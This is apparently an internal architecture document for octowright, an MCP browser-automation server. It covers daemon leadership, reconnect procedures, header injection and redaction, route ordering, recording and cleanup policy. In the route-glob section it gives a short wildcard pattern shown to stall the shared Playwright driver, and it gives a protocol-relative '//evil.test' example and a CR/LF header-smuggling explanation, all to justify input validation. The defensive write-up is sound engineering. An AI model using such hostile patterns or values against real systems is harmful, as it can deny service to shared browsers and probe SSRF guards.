**Follower version skew (why a daemon restart is not a deploy).** A follower is a subprocess its MCP *client* owns and supervises, and the leader-recovery window exists so it **survives** a leader restart rather than dying with it. Both are deliberate, and together they mean `octowright restart` can never deploy follower-side code (`daemonize`, `cli/_leader_election`, `cli/serve`, `cli/_daemon_ready`): leader-side fixes go live immediately while every connected follower keeps running whatever it started with, until *its own client* reconnects and spawns a fresh one. Killing the subprocess is not a shortcut — the client does not respawn a dead stdio server, so it just breaks that session until the same manual reconnect happens. Followers therefore report their version in each bridge snapshot (`follower_version`, defaulting to the writer's own `VERSION`), and `octowright_status()["bridge"]["summary"]` carries `leader_version`, `follower_versions` (a count per version) and `stale_follower_count`. Without them a follower identifies itself as `X-Octowright-Follower: <pid>` and nothing else, and diagnosing a skew means reading process start times against commit timestamps by hand. A snapshot written by a follower too old to report one counts as `unknown` **and as stale** — that follower is stale by definition, since the field arrived with the check.

**Per-client reconnect (the user performs this, not the agent).** When a stdio session is gone, the recovery step is client-specific; the runtime ships this same matrix in the MCP server `instructions` string (`server/_state.py`), so keep the two in sync. In-session (keeps the conversation): Claude Code — `/mcp` → octowright → **Reconnect** (choose it twice; the first attempt is a known silent no-op); Cursor — Settings → Tools & MCP → toggle octowright off then on; Cline (VS Code) — MCP Servers panel → octowright → **Restart Server**; Copilot in VS Code — Command Palette → **MCP: List Servers** → octowright → Restart; Windsurf — Cascade plugins (MCP) panel → **Refresh**; Gemini CLI — `/mcp disable octowright` then `/mcp enable octowright`; GitHub Copilot CLI — `/mcp reload octowright`; Continue / Zed — re-save the MCP config file (hot-reloads). No in-session path (restart loses the conversation): **Codex CLI, OpenCode, Amp** — the user must restart the client. Universal fallback for any client: a full client restart recovers the server.

**Leader-mode observability**: `octowright_status()["daemon"]["mode"]` reports how the answering leader is running: `"daemon"` (a detached daemon — the resilient default; restarting it leaves followers connected and they reconnect), `"inline"` (the leader is running *inside* an MCP client's own process — fragile: if that client exits or is restarted, every browser dies and other clients lose their backend), or `"unknown"` (leader not yet wired). For `"inline"`, `daemon["inline_reason"]` is `"no_singleton"` (deliberate, via `--no-singleton`), `"daemon_spawn_failed"` (the fallback when the detached daemon this process spawned never answered), or `"election_contention"` (another instance held the election lock and never produced a leader — this process spawned *nothing*, so the daemon log describes someone else's process and is deliberately not quoted). `cli/serve.py` emits a loud stderr warning for both fallback cases. An agent seeing `mode == "inline"` with reason `daemon_spawn_failed` should treat the session as fragile and avoid `octowright restart` (which would kill that very leader).

**Daemon spawn: detachment, readiness, and saying why.** Three field-reported gaps, all in the "the failure gives you nothing to act on" class:

- **Cross-platform detachment.** `daemonize.spawn_daemon` detached with `start_new_session=True` only. That is POSIX (`setsid`); CPython accepts it on Windows and silently does nothing. Two separate things tie a Windows child to its parent and they need different flags: the **console** (`DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP`) and the **job object** — a child joins the parent's job by default, so a CI runner that tears its job down with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` kills the daemon with the step no matter what the console does. `_detach_kwargs()` therefore also asks for `CREATE_BREAKAWAY_FROM_JOB`, and `_detach_candidates()` returns the ordered flag sets to try — two on Windows (with breakaway, then without, for a job lacking `JOB_OBJECT_LIMIT_BREAKAWAY_OK`, which makes `CreateProcess` refuse the spawn outright with `ERROR_ACCESS_DENIED`) and exactly **one** on POSIX, so a genuine failure there is not retried identically and reported from the second attempt. **Field-verified on 0.16.0** against a self-hosted Windows runner: the same leg that failed on 0.14.4 with `daemon never wrote a lockfile` (and then `WinError 10061` in its cleanup step) now starts a daemon and `serve --wait-ready` prints `leader ready at http://127.0.0.1:6286/mcp/`, so that half of the failure was octowright's, not the image's. **Which candidate won is now recorded rather than unknowable.** It was not merely unverified — nothing could have answered it, because a successful spawn returned a pid and said nothing about how it got one, so a green Windows leg proved that *something* worked and not which rung. `_spawn_detached` logs `daemon.spawn_detached` with `attempt`/`attempts_available` on success, and `daemon.detach_candidate_refused` when `CreateProcess` rejects breakaway and the ladder drops the flag. That refusal was previously a bare `continue` — the silent swallow the comment beside it invokes this repo's own policy to forbid — and it is the load-bearing signal, since a fallback spawn means the daemon will *not* outlive a job teardown. Read `user_state_dir()/logs/octowright-daemon.log` on the runner. **Still unverified:** whether the daemon actually *outlives* a job teardown — the field report shows it starting, not surviving the step, and settling that needs a runner whose job tears down. A job that forbids breakaway still takes the daemon down with the step; no child process can change that, and the fallback only keeps it no worse than console detachment alone.
- **A readiness budget you could not reach.** `wait_for_daemon(timeout=10.0)` was hardcoded *and* every caller invoked it with no arguments, so the 10s was unreachable from CLI or env — and exceeding it is not a hard failure, it silently degrades to fragile inline mode. The budget now resolves from `OCTOWRIGHT_DAEMON_READY_TIMEOUT` / `--ready-timeout`.
- **The log the error tells you to read is the wrong one.** Daemon stderr goes to `user_state_dir()/logs/octowright-daemon.log` (0600), so a workflow's own `octowright-serve.log` holds the *follower's* output and is empty by design on this failure. Every spawn-failure path now quotes `daemonize.daemon_log_tail()` — the inline fallback, the post-bridge respawn, and `--wait-ready`.

**`octowright serve --wait-ready`** is the scripting/CI entry point: ensure a daemon leader exists (probe → adopt canonical port → spawn), wait for it to answer HTTP, print its MCP URL on **stdout** and status on **stderr**, and exit `0` ready / `1` not — with the daemon log tail on failure. It deliberately does **not** take `_ensure_leader_or_inline`'s inline fallback: serving in the foreground forever is right for an MCP client that wants *a* working server and wrong for a script whose whole contract is an exit code. Both callers share **one** split-brain-guarded election (`cli/_leader_election.elect_leader` — probe → lock → re-probe → adopt canonical port → spawn → confirm under the lock); only the never-answered branch differs, because a second copy of that sequence is the repo's most-patched invariant and would drift. Lock **contention is normally not an error and does not reach a caller**: another instance holding the lock is already electing the leader we want, so `elect_leader` waits for it and returns that (spawning instead would be the split-brain the lock exists to prevent). Only the `TimeoutError` from the *acquire* means contention — `TimeoutError` is an `OSError` subclass and `asyncio.TimeoutError`'s alias, so wrapping the whole locked body would let a timeout raised while probing/adopting/spawning be misreported as "someone else is electing" and burn a second readiness budget waiting for a daemon nobody was starting. If the winner never produces a leader either, that is raised as `ElectionContended` rather than folded into the spawn-failure branch: nothing was spawned here, so `inline_reason="daemon_spawn_failed"` would report a failure that did not happen and the quoted daemon log would describe a process this one never started. `wait_for_daemon` validates the lockfile's recorded URL is loopback before probing or returning it — the same-user-writable lockfile flows straight to `--wait-ready`'s stdout, which the documented CI contract consumes. The post-bridge respawn keeps its own stricter guard and its own sequence — `_adopt_canonical_leader` deliberately falls through when the canonical port serves a healthy octowright that has not published a readable lockfile, which is fine for a startup spawn and is the observed split-brain for a respawn — but it now acquires the lock with the same `_election_lock_timeout()` budget, since it holds the lock across `wait_for_daemon`. `--wait-ready` is rejected with a `UsageError` alongside `--no-singleton` (which serves inline), `--no-http` (which removes the endpoint readiness is probed on), or `--daemon-mode`, rather than silently accepting a flag the caller believes took effect.

Raising the readiness budget has a second-order effect worth knowing: the electing process holds the election lock **across** `wait_for_daemon`, so `_election_lock_timeout()` scales the lock's acquire wait with `daemon_ready_timeout()` plus headroom. Otherwise a concurrent `serve` would give up on the lock first, and an uncaught `TimeoutError` in `_ensure_leader_or_inline` is a traceback instead of a working session. It removes the hand-rolled background-`serve` + bash/pwsh lockfile poll a workflow otherwise has to write itself.

**Failure payloads carry their own cause.** A macro failure builds `session.diagnostic_bundle(console_tail=MACRO_FAILURE_CONSOLE_TAIL)` — passing nothing there leaves `console_tail` unconditionally `[]`, since that is the *only* caller of `diagnostic_bundle` in the tree. The payload therefore reported the symptom ("timed out waiting for `#student-name-edit`") while the line explaining it (`net::ERR_NETWORK_CHANGED`) sat unread in the session ring buffer, findable only by opening the raw JSONL afterward. `_select_console_tail` **reserves half the window for the plain tail**, fills the rest with the newest diagnostic-level messages, and spends anything spare on more recent lines, keeping chronological order. Both halves are load-bearing: a plain tail is fragile exactly when it matters, because a chatty page flushes the useful line out of the window — but claiming diagnostics *first and unbounded* is the same failure mirrored, since a page that logs `limit` warnings at load (favicon 404, CSP report, deprecation notices) would leave a click that fails twenty minutes later shipping ten load-time warnings and nothing from around the failure. Each message's text is capped at `MACRO_FAILURE_CONSOLE_TEXT_CHARS` — the count bound does not bound *size*, and a page that logs a stringified API response would otherwise push multi-MB strings over the MCP transport on the failure path. Only built on the failure path, so the happy path pays nothing. Console-level classification is canonical in **`octowright/console_levels.py`** (a package-root module, like `dashboard_events.py`, so `session/`, `server/` and the root summarizers share it without any reaching into another's private modules — and so a pure summarization module doesn't import the browser stack: routing this through `session/_constants.py` took `capture_summaries` from 6 stdlib imports to 508 modules including Playwright). It exists because `capture_summaries`, `server/browser/inspect_console.py` and this selector each classified levels independently and had already drifted. The level spellings are **measured, not assumed** (a page calling every `console.*` method driven under all three engines on Playwright 1.62): all of chromium, firefox and webkit report `console.warn` as **`warning`** — an earlier note here claimed Firefox says `warn`, which was inherited from the pre-existing sets and never verified; `warn` is retained only as a harmless defensive alias. The same measurement found a real gap: `console.assert` arrives under its own **`assert`** level in all three engines, so classifying it as anything but an error meant the one line naming a failed invariant was neither counted in `error_count` nor claimed by the failure tail — it is now in `ERROR_CONSOLE_LEVELS`. The dashboard console panel shared the bug from the other end: its Warn filter compared the raw level against the option value `warn` and therefore matched nothing, so `console-panel.ts` now groups by a `severityForLevel` mapping instead of raw equality. `_select_console_tail` also **copies** each entry it returns — `list(session.console)` copies the list, not the dicts inside it, so handing back originals let one consumer's in-place edit rewrite the session's console history for every later reader. Relatedly, `engines._detect_windows_media_stack_missing` names the Server Core launch failure (`WSALookupServiceBegin ... 10091`, `mf.dll`/`mfplat.dll`) as a missing-OS-component problem rather than letting it read as a transient network fault; it is ordered **before** the generic network detector because the raw text can carry `net::` noise and "check your DNS/proxy" is actively misleading here — and gated on the host platform *because* it is ordered first, so a Linux/macOS failure that merely carries one of those tokens can't be answered with a Windows-only remedy and have the correct sandbox/target-closed diagnosis suppressed.

### Key Files

| Path | Role |
|------|------|
| `src/octowright/browser_pool/pool.py` | `BrowserPool` — top-level lifecycle entry points |
| `src/octowright/browser_pool/lifecycle.py` | Per-session launch / close / handoff logic |
| `src/octowright/browser_pool/listeners.py` | External-close eviction (context.close, browser.disconnected, page.close) |
| `src/octowright/browser_pool/options.py` | Launch-kwargs assembly + tile placement |
| `src/octowright/browser_pool/roster.py` | `browser_spawn_roster` parallel launch coordination |
| `src/octowright/browser_pool/launch_helpers.py` | Shared per-launch wiring (recorder, listeners, init scripts); `build_recording_kwargs` assembles the video+HAR context kwargs under the pool's recordings root |
| `src/octowright/browser_pool/errors.py` | Pool-specific exception types |
| `src/octowright/browser_pool/visuals.py` | Emoji badges, title injection, macro-status pill helpers |
| `src/octowright/browser_pool/_assets/*.js` | Init scripts injected into every page (title tag, corner badge, macro pill) |
| `src/octowright/session/core.py` | `BrowserSession` dataclass |
| `src/octowright/server/_request_context.py` | Republishes each MCP request's context into a contextvar via a `ServerMiddleware`. MCP 2.0 removed the SDK's own `request_ctx`, and the progress heartbeat + idempotent dispatch read it *ambiently* (no `ctx` parameter on the ~130 tools, so nothing leaks into the client schema). Also normalizes `_meta`, which 2.0 made a plain dict with snake_cased spec keys. |
| `src/octowright/server/_state.py` | Shared singletons: `pool`, `mcp` (an `mcp.server.mcpserver.MCPServer` subclass), `scenario_pool`, and the plugin registry (`resolved_plugins`) that each enabled session-kind plugin's pool is reached through — see `OCTOWRIGHT_PLUGINS` |
| `src/octowright/server/browser/lifecycle.py` | MCP tools: `browser_launch`, `browser_close`, `browser_navigate` |
| `packages/octowright-terminal/` | The terminal session-kind plugin (PTY/SSH/telnet), a separate distribution reaching core only through the `octowright.session_kinds` entry point. Core has no terminal-specific code left. See **Terminal Sessions (plugin)** and the package's own README. |
| `src/octowright/cli/serve.py` | Leader-election + server startup |
| `src/octowright/http/app.py` | Starlette app factory |
| `src/octowright/macros/` (package) | Record → save → replay pipeline; `execution.py` runs macros, `storage.py` reads/writes JSON, `runtime.py` dispatches actions, `semantic.py` summarizes recordings into human-readable digests (pure helpers, no MCP-tool registry dep — the `@mcp.tool macro_explain` wrapper lives in `server/macros.py`). **Replay classification invariant:** every event the recorder emits must be replayable, skipped, or stripped — `dispatch_simple` counts an unclassified kind as an *error*, so a strip-list that drifts from the recorder turns passive rows into mass bogus failures (a recorded 608-frame socket stream once reported 608 failures per replay). `RECORDER_NOISE` is therefore *derived* rather than hand-mirrored between `runtime.py` and `recording_import.py`, and a test scans `recorder.record` call sites to fail on any NEW unclassified event. |
| `src/octowright/dashboard_events.py` | Pure in-process pub/sub for dashboard SSE/WS fanout; lives at the package root so `server/` MCP-tool modules don't have to reach up into the `http/` layer |
| `src/octowright/scenarios.py` | `Scenario`/`Participant` models + YAML/Python loaders |
| `src/octowright/personas.py` | Persona metadata + credential resolution |
| `src/octowright/resolve.py` | `suggest_for_url()` — persona ranking by URL |
| `src/octowright/defaults.py` | All env-var-driven defaults (port, paths, timeouts). `get_default_url()` resolves the actual bound port at runtime; `get_default_label()` derives username/repo from CWD + git. |
| `src/octowright/http/routes/new_tab.py` | `GET /new-tab` — default landing page for `browser_launch` with no URL. Serves Otto logo, wordmark, live status strip (version, commit, uptime, browser count). Time-based background tint. `GET /otto.svg`. |
| `.octowright/config.yaml` | Per-project config file (project root or any parent). Supports `label:`, `persona:`, `profile:`. Read by `get_default_label()` / `browser_launch` at daemon startup. `octowright init` scaffolds a starter copy. |
| `tools/octowright_demos/` | **Out-of-wheel** demo-bundle generation (catalog, indexer, runtime, exports). Imported by `scripts/demos/*` and `tests/test_demos_*`; not part of the shipped package. |
| `demo/bundles/` | Source-of-truth demo bundles (`demo.yaml` + recorded artifacts). Tracked in git. Re-recording requires browser sessions. |
| `demo/tutorial-export/` | **Derived; gitignored.** Verbatim mirror of `demo/bundles/.../artifacts/` plus generated JSON manifests, consumed by `site-octowright-com`'s sync workflow. Regenerate with `make export-demos` (no browsers needed — just `shutil.copytree` + JSON writes). |
| `docs/architecture/MCP-SHARED-CONTRACT.md` | HTTP API spec (endpoints, request/response shapes) |
| `docs/architecture/` | PlantUML diagrams (render with `make diagrams`) |

### Launch-time extra HTTP headers

`browser_launch(extra_http_headers={...})` sets Playwright's **context-level** `extra_http_headers`, so they ride every request that browser makes — every page, popup, new tab and subresource — for its whole life. Like `base_url`, it is **silent when there is nothing to say**: a launch that passes no headers passes no `extra_http_headers` argument at all, so every pre-existing launch is untouched.

Context level was chosen over a route interceptor on measured grounds, not taste. Across chromium, firefox and webkit (Playwright 1.62, real local server, headers read off the wire): context headers reach the server; a page-level `set_extra_http_headers` overrides them; and — the load-bearing one — the SSRF guard's own `route.fetch()` validation hop carries them too, so the chain the guard checks and the chain the browser follows are not different requests. A route-level injector has no such guarantee for free, and a *fulfilling* route (`mock_route`) suppresses a context route handler entirely, so a route-based injector would silently skip any mocked pattern.

Values are validated before they can forge a request rather than decorate one: header names must match RFC 7230's token production, values may not contain control characters (a CR/LF ends the header and starts another, so one value could append a second header the caller never wrote), and the map is bounded (`MAX_EXTRA_HTTP_HEADERS`, `MAX_EXTRA_HTTP_HEADER_VALUE_CHARS`) because it rides every request.

`browser_set_extra_http_headers(instance_id, headers)` is the **page-level** companion, also a replayable macro action (`set_extra_http_headers`), for the header a run only learns partway through — log in, then carry the token. Page-over-context precedence is measured on all three engines. It is per **page**, so a popup or new tab opened afterwards does *not* inherit it; that asymmetry is why the launch-time option exists alongside it.

**Record-time redaction is by header NAME.** `press_key`/`evaluate`/`select_option` are scrubbed only under the blanket `all` mode because a selector-less sink genuinely cannot classify its own value — but a header carries its name, and the name says whether the value is a secret. So under the DEFAULT `passwords` policy an `Authorization`/`Cookie`/`X-Api-Key` value is replaced with `<redacted:header>` while `X-Env` stays readable; `all` scrubs every value, `off` scrubs none. Names are never scrubbed — which headers a run set is the diagnostic value, and the name is not the secret. The page always receives the real value. Consequently a macro saved from such a recording holds the placeholder, not the token: replay (and the exported CLI script) **refuse** it with a message naming the fix — parameterize as `"Bearer {{token}}"` — rather than sending it and surfacing a puzzling 401 several actions later.

`browser_inject_headers(instance_id, url_pattern, headers)` / `browser_uninject_headers` are the **per-endpoint** layer (macro actions `inject_headers`/`uninject_headers`), a **`context.route`** handler that `fallback`s with the extra headers merged in. Context, not page: a page route dies at the page boundary, so a caller had to re-register after every page switch and hope they caught them all — and the interesting traffic is often exactly in a popup. Measured on all three engines: a context route sees a popup's requests and the popup receives the header. Reach for it only when headers genuinely must vary by URL: it intercepts, so every matching request pays a handler round trip, where the other two ride requests the browser was making anyway.

**Route order is measured, and its failure is silent.** Two separate rules decide which handler wins, and only one of them is about order.

*Within one level*, handlers run **last-registered-first** — on the page and on the context alike. The context case matters because `ssrf_guard.install_navigation_guard` is itself a context route installed at launch: an injector registered later therefore runs **before** it, so the guard's `route.fetch()` validation hop carries the injected headers and validates the same request the browser then makes. That is why `launch_helpers.install_context_routes` exists rather than two calls at the call site — it registers the guard first and the scoped launch-header routes second, so they run in the other order. Reversed (as it briefly was), the guard's unauthenticated validation fetch and the browser's authenticated request are two different requests, and a redirect the policy would refuse is never seen. Pinned by the `tests/test_route_order_live.py` canary, because the guarantee is Playwright's rather than ours and nothing here would otherwise notice it changing.

*Across levels*, order does not enter into it: **page routes are evaluated ahead of context routes**, and a handler that *fulfills* ends the chain. `mock_route` is a page route and `inject_headers` is a context route, so a mock on an overlapping pattern suppresses the injector completely — in **either** registration order — and the injector's handler is not invoked at all (measured on chromium, firefox and webkit; same canary). This changed with the page→context move: while both were page routes, last-registered-first meant only the mock-then-inject order lost, which is the single direction `inject_headers` warned about. Both install sites now log `octowright.session.header_injection_shadowed_by_mock` on an exact-pattern collision; an overlapping-glob collision still cannot be detected and is documented only. Handlers live in `_header_routes`, deliberately separate from `mock_route`'s `_active_routes`, so a mock and an injector may share a pattern without one evicting the other's handler reference. The route callback is a registered gate bypass (`event-critical`), like `mock_route`'s: a route handler must unblock the network request the active operation is awaiting.

**A route glob is a regex, and the match runs where nothing here can bound it.** Playwright compiles a URL glob before matching every intercepted request: `**` becomes `(.*)`, `*` becomes `([^/]*)`, so `**a**a**b` is `^(.*)a(.*)a(.*)b$`. No quantifier is nested inside another, so the blow-up is polynomial rather than exponential — but the exponent is one per wildcard and the *caller* chooses it. Measured against a 129-character URL: 3 wildcards 0.04s, 4 wildcards 0.95s, **5 wildcards 18.0s**. That is an eighteen-character pattern.

The reason this deserves its own note, rather than being one more slow call, is **where it runs**. The match happens inside the **Node driver**, which `BrowserPool` shares across every session (`pool.py`'s single `async_playwright().start()`), so a hostile pattern installed on one browser stalls navigation in all of them — measured at 3000x on a victim browser that had no route of its own. The leader's Python event loop keeps running normally throughout, which is precisely why none of this repo's hang machinery notices: `session/timeouts.bounded` bounds an *awaited Python call* and this is not one, the operation gate sees a healthy session, and `doctor`'s engine probes pass. Playwright's own `timeout=` is enforced in that same wedged driver, so it cannot fire either — a `page.goto(timeout=45000)` was observed still running at 180s.

`url_patterns.validate_url_pattern` therefore refuses the pattern **before** it is forwarded (`MAX_URL_PATTERN_WILDCARDS`, counting wildcard *runs* — `*` and `**` each contribute one group, so counting only `**` would leave `*a*a*a…` unguarded). Refusing in Python is sufficient exactly because the wedge is driver-side: a pattern octowright never sends is never compiled by anyone. It guards `mock_route`, `inject_headers` and the launch-time `extra_http_headers_urls` — that last one already capped *length* at 2048, which an eighteen-character attack walks straight past. `unmock_route`/`uninject_headers` need no guard; they pop an already-registered handler and compile nothing. The cap is pinned as a **constant** as well as by timing, because the test that would catch a raised cap is the test that hangs on it: at 6 wildcards the match takes ~500s and would blow the 300s per-test timeout, killing the run instead of reporting a failure.

**Scoping launch headers: `extra_http_headers_urls`.** Context-level headers have no URL filter, so they ride **every** request the browser makes — including cross-origin subresources. On Chromium that makes those requests CORS-preflighted, and a third party that does not echo `Access-Control-Allow-Headers` rejects them outright; measured, and reported from the field as blocked font/CDN requests with a page that never finished rendering. Firefox and WebKit applied the header *below* the CORS check and were unaffected, so this is **Chromium-specific rather than universal** — worth knowing before reproducing it elsewhere. Passing URL globs moves the headers onto scoped **context routes** (`launch_helpers.install_scoped_header_routes`) that still follow popups and new tabs but leave everyone else's requests untouched; the context then carries no unscoped headers at all, or they would apply twice. It exists alongside `browser_inject_headers` because the launch navigation happens *during* launch, which a post-launch call cannot cover.

**`timeout_ms` reaches the CSS-selector path, not just the ARIA one.** The trap it guards against is accepting the field everywhere and honouring it only on the semantic path: `macros/runtime._dispatch_click_or_fill` forwards it to `click_by`/`fill_by`, so popping it before the `click`/`fill` fallback — with `session.click` taking no timeout parameter and hardcoding `DEFAULT_ACTION_TIMEOUT_MS` — silently ignores it. So a macro action carrying `timeout_ms` on a selector click linted clean, saved from the dashboard editor, and ran on the 15s default; reported from the field as a failing click costing 15s four times over, with the obvious mitigation turning out to be a no-op. The **MCP tools had the same hole** — `browser_click`/`browser_fill` forwarded it to the semantic pair and dropped it on `session.click(selector)` — so an agent had no working knob either. Both `click`/`fill` now take `timeout_ms` and resolve it exactly as `click_by`/`fill_by` always did.

Two resolution details are load-bearing and pinned by tests. **`None` resolves to the default rather than being forwarded**: Playwright reads an explicit `timeout=None` as *no timeout*, so splatting an action carrying `"timeout_ms": null` would hang forever instead of falling back. **`0` also resolves to the default**, because Playwright reads `timeout=0` as *disable the timeout* — a macro author writing `0` means "don't wait", not "block this run indefinitely". `x or DEFAULT` looks like a null check, so a refactor to `x if x is not None else DEFAULT` would silently reintroduce the hang.

Relatedly, `macros/lint_fields._click_or_fill_allowed` derives its allowed set from the signature rather than naming `timeout_ms` as a literal. A literal there is hand-maintained drift inside the very module whose docstring argues against hand-maintained tables, and a test fails if the literal comes back.

**A browser can say what headers it is sending.** Each `browser_list` entry carries `extra_http_headers`. `extra_http_headers` otherwise reaches `new_context()` and is thereafter known to Playwright alone, which exposes no getter; neither the page-level `browser_set_extra_http_headers` nor `browser_inject_headers` kept a copy either (the latter stores the route *closure*, from which the headers cannot be recovered). A client that tagged traffic with a per-run header and later **adopted** an already-running browser therefore could not tell a current tag from a stale one, and resorted to tracking its own launches in-process — wrong across restarts and blind to other clients' browsers. The three scopes are reported **separately, never merged**, because their reach genuinely differs and a flattened map would assert a precedence that does not hold uniformly: `launch` is context-level and rides every request (unless `launch_url_patterns` narrows it), `page` covers only the active page and overrides the context there, and `injected` are context routes keyed by URL glob. A scope with nothing set is omitted, so `{}` means no extra headers anywhere rather than "not reported". Values are scrubbed by header **name** through `http_headers.redact_headers_for_report`, which shares the recorder's classification but **floors the mode at `passwords`**: `OCTOWRIGHT_REDACT_INPUTS=off` is an opt-in for *recordings* (a 0600 file on the operator's own disk), and honouring it here would turn that into "ship my bearer token to every MCP client". `all` is still honoured, being stricter.

**Request headers are recorded, and returned on request.** Recorded rows carry `headers`. A row holding only url/method/resource_type/status makes every header feature unverifiable from the tool surface — a field report set a launch header, checked here to confirm it applied, saw nothing, and nearly concluded the feature was broken. Scrubbed by header **name** with the same policy the JSONL recorder uses, since a browser sends `Cookie`/`Authorization` on ordinary requests and this output goes to an LLM. Read from the synchronous `request.headers` (`all_headers()` is async and this runs in an event handler), which can omit a few values the async form returns.

`browser_network_requests` returns them only under **`include_headers=True`**, and that is the documented way to verify a launch/inject/page header actually rode a request. The default is off because a header map is most of a row's size — **~900 JSON chars against ~130 without**, measured on a typical Chromium navigation set — and nearly all of it is identical boilerplate (`user-agent`, `sec-ch-ua*`, `accept`) repeated per row, so always-on took an unfiltered read of an ordinary 200-request page from roughly 6.6k tokens to 45k. The same read had **no row cap at all** and could return the whole 5000-entry deque; it now returns `NETWORK_REQUESTS_DEFAULT_LIMIT` (200) rows per call with `returned`/`truncated` in the payload, `limit` up to 1000, and a non-positive `limit` falling back to the default rather than meaning unbounded — an LLM must not be able to remove the cap by passing `0`. When a read is capped, `next_cursor` is the absolute index of the first **matching** row not returned, not the row after the last one returned: the cursor indexes the unfiltered stream, so the other choice silently loses every match the cap left behind. Two in-process readers genuinely need everything and pass `limit=None`: `browser_network_summary` (it aggregates — a capped read would report wrong counts) and `capture_create(kind="network")`, the full-fidelity sink, which also asks for headers since it writes to disk and is read back through `capture_lines`/`capture_search` rather than dumped inline.

**Never restored from a JSONL recording.** `LaunchOptions.from_launch_record` drops it, the same exclusion `channel`/`executable_path`/`launch_args` already carry: a recording is untrusted input (another local user, a poisoned CI step), and a header it could set would attach an attacker-chosen `Authorization`/`Cookie` to every site the relaunched browser visits. It *is* carried by `to_pool_kwargs`, which is the in-memory handoff/relaunch path and is trusted.

### Host-relative navigation

A macro is the behaviour; the persona is the *where*. The browser context resolves relative paths against a `base_url`, so one macro replays against any deployment by launching it as a different persona.

`base_url` resolution, most specific first: an explicit `LaunchOptions.base_url` (for a library caller with no persona to speak for it — a suite pinned to a dev stack), else the launch profile's persona `default_url`. Both cases are **deliberately silent when there is nothing to say**: a profile name need not be a saved persona, and a persona need not declare a `default_url`. Neither passes `base_url=None` — they pass nothing at all, so absolute URLs and every pre-existing macro keep working untouched.

`browser_navigate` accepts a **single** leading slash (`/orders`): same-origin by construction — no scheme to deny, no new host to reach — so `_reject_unsafe_url` lets it through to Playwright for resolution. **Two** slashes is protocol-relative (`//evil.test/x` is a different host) and still goes through the full absolute-URL checks. That relaxation is only sound if the inherited origin is itself trusted, so a `base_url` is validated through the same guard every navigation uses — otherwise it would be a way to reach a host the SSRF policy refuses by writing `/` in a macro.

### JSONL Recording

Every browser action is appended as a JSON object `{ts, action, ...fields}` to a `.jsonl` file per session. JSONL is:
- **Streamed live** via WebSocket `/api/sessions/{id}/tail`
- **Exported** to standalone Python/TS scripts via `export.py`
- **Replayed** as a macro via `macros/execution.py`
- **Diffed** as golden accessibility-tree snapshots via `server/goldens.py`

### MCP Tool Registration

Tools are `@mcp.tool`-decorated async functions in `server/browser/`, `server/macros.py`, `server/personas.py`, `server/scenarios.py`, `server/goldens.py`, and `server/meta.py`. The `mcp` singleton lives in `server/_state.py` and is imported by each submodule. Adding a new tool: decorate a function with `@mcp.tool` in the appropriate submodule — no manual registration needed.

### Macro Status Pill

Every page launched by the pool gets a faint translucent overlay at the bottom-center. While `run_macro` is dispatching, the pill shows the per-browser ID chip (matches the corner-badge color), a live elapsed counter, and the current action description. After completion the pill stays visible with `done` / `failed`; the next macro's `start` push resets the counter. Holding **Alt** makes the pill clickable — click opens a themed modal with the full per-push run history. The pill is `pointer-events: none` by default so it never intercepts page clicks.

Pass `slowmo_ms=N` to `macro_run` / `macro_run_sequence` (or set `OCTOWRIGHT_MACRO_SLOWMO_MS`) to insert a per-action delay between status push and dispatch — useful for following execution by eye.

### Silent-swallow policy

Bandit's B110 (`try/except/pass`) and B112 (`try/except/continue`) are blanket-suppressed in `make lint`. Production code uses these patterns only in:

- Process shutdown paths (signal-handler restore, task-cancel await)
- Dir scans skipping orphans (profile cleanup, recording cleanup)
- JSONL/YAML parse-skip on per-line malformed input (recorder, macro list, persona list)
- Best-effort I/O during teardown

Silent swallow in **user-action paths** must `log.warning` or `log.debug` instead of truly swallowing. The bandit suppression assumes the swallow is intentional, not an excuse to hide failures from the user.

**`octowright cleanup` scope.** The CLI prunes stale recordings, screenshots, videos and traces under `RECORDINGS_DIR` — and nothing else. Two deliberate exclusions:

- **Profiles.** `profile_cleanup` exists, but only as an MCP tool, because deciding a profile is abandoned requires knowing which profiles live browsers are using and the CLI is a *separate process* from the daemon with no access to the pool. It populates `in_use` from `pool.iter_sessions()`; the CLI cannot, so it does not offer the operation rather than offering an unsafe one. A profile dir holds live session cookies for every site that persona logged into.
- **Macro artifacts.** They live at `<RECORDINGS_DIR>/artifacts` and so sit inside the tree the sweep walks; `recording_cleanup.PRESERVED_SUBDIRS` excludes them. Age is a fair proxy for "this recording is disposable" and a bad one for "this artifact is disposable" — a recording is a byproduct, a critical point is something a person wrote, and the artifact whose files stop being touched is the stable one that keeps passing. `.frame-cache` is deliberately *not* preserved: it is a regenerable cache and reclaiming it is the point.

### Idle Watchdog

The idle watchdog is **disabled by default**: the daemon stays up until an explicit `octowright restart` (or reboot). Auto-exit is opt-in because the daemon holds live browser state and its exit closes the follower's stdio — which breaks every connected MCP client and drops open browsers mid-session, with no transparent wake. Opt into auto-exit (for CI / shared / resource-constrained hosts) by setting `OCTOWRIGHT_IDLE_GRACE=<seconds>` or `--idle-grace <seconds>`; then the daemon exits after the pool sits empty that long. `--keep-alive` force-disables it and propagates to the detached daemon. A non-positive value or `off`/`never`/`none`/`disabled` also disables it.

### Frontend

TypeScript SPA in `packages/octowright-frontend/`. Built files land in `src/octowright/server/frontend/`. The dashboard auto-polls `/api/sessions` and uses WebSockets for live event streaming. Types in `packages/octowright-frontend/src/types.ts` mirror the Python Pydantic/dataclass models. A session-kind plugin may ship its own dashboard renderer (`FrontendAsset` in `octowright.plugins.contract`), served as a static asset by `http/routes/plugin_assets.py`; `session.ts` resolves a non-core `kind` through the plugin registry (`plugin-registry.ts`) rather than importing any plugin's renderer directly, so a plugin's bundle never lands in core's own SPA bundle. The terminal plugin's xterm-based renderer is the first example — see `packages/octowright-terminal/README.md`.

### Terminal Sessions (plugin)

Terminal sessions (PTY shell, SSH, telnet) are a **session-kind plugin**, not part of core: `packages/octowright-terminal` (the `octowright-terminal` distribution), reaching core only through the `octowright.session_kinds` entry point — see `OCTOWRIGHT_PLUGINS` above. Core keeps no terminal implementation: no `terminal/` package, no `provide.uterm` import, no hardcoded scenario branch, and no per-action table naming a plugin kind. A terminal recording written before core's launch transaction existed opens with the plugin's own `terminal_start` row rather than the generic `session_start`, and core classifies it the same way it classifies everything else — from the recording's filename, which carries the kind directly and cannot contain the hyphen the name is split on (`plugins.identity.KIND_RE`). The `terminal_*` tools, the `terminals` capability profile, the scenario-participant kind, and the dashboard's xterm-based renderer are all supplied by the plugin once it is enabled.

